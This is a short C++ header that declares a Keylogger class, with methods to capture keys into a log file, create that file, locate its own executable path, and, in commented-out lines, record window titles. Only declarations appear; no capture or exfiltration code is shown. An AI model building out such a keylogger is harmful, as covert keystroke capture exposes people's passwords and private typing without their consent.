#pragma once

#include <string>

#define FILEEXT ".log"
#define DEBUG
//#define DEBUG_TO_LOGS

class Keylogger
{
private:
	std::string intToString(int);
	std::string getSelfPath();
	std::string dirBasename(std::string);
public:
	

	//bool update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs);
	//std::string get_window_name();
	void get_key(std::ofstream &file_logs);
	std::string create_file();
};
